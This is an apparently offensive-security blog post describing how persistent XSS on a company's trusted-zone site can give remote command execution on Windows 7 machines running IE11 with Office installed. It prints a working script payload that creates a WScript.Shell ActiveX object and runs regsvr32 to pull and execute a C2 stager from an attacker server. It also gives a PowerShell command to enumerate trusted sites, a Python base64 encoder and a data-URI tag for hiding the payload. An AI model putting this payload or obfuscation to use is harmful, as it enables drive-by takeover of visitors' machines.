## XSS to Shell and beyond... 

So I started having a think about XSS (Cross-Site Scripting) issues and whether they could be more serious further.... 

XSS has really always been more about stealing sessions, manipulating users, defacing sites and capturing creds if youre lucky. However, in the post i am going to demonstrate how abusing a trusted domain can lead to one time RCE or a C2 stager on the victims machine. 
Providing certain conditions are met, this could mean that by a user passively visiting a vulnerable site, that there machine could pass us control or permit arbitrary command execution.

### Pre-requisites for this PoC:

- MS Office needs to be on the victims machine (The technique uses VBScript (inside ActiveX) to execute the stager.)
- The users must be using IE (tested to version 11 on Windows 7)
- The vulnerable site needs to be in one of the target companies 'trusted domains/sites', This permits IE to run ActiveX on medium risk setting.

### PoC Summary:

This PoC utilises the trust relationship between the GPO settings applied on workstations and servers to whitelisted trusted domains.

The victim browses to one of these domains where the site is vulnerable to persistent XSS (server stored payload). Non-persistent can also work but this increases the difficulty to exploit.

The payload utilised creates a new activeX object, Wscript.Shell. This object accesses the underlying OS command line. This object can be used to call the Command 'Run' where a command can be specified and executed.

In this case I use 'regsrv32' to fetch a stager beacon from my C2 server. From this the C2 payload is run as a separate process to the browser and window. Therefore if the user closes the browser or session I still have remote command.

### Payload:

The PoC payload described above (where X is the IP of the C2 server):
```
<script>

	var r = new ActiveXObject("WScript.Shell").Run("cmd /c regsvr32 /s /n /u /i:http://xx.xx.xx.xx:80/a scrobj.dll");

</script>
```
A trick to find out the trusted sites, pop open powershell and run the following:
```
Get-Item "HKLM:\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMapKey" | select -ExpandProperty Property
```
The visiting user will be prompted once with an ActiveX prompt, if they click yes the payload is executed.

### Obfuscate the payload:

```
#!/usr/bin/python

import sys

if len(sys.argv) <= 1:
	sys.exit('please give a string to encode, surrounded by quotes')
else:
	a = sys.argv[1]
	str = a.encode('base64','strict')
	print str
```
```
./base64encode.py 'payload string'
```

```
<script src="data:text/javascript;base64,{insert base64 value here}"></script>
```
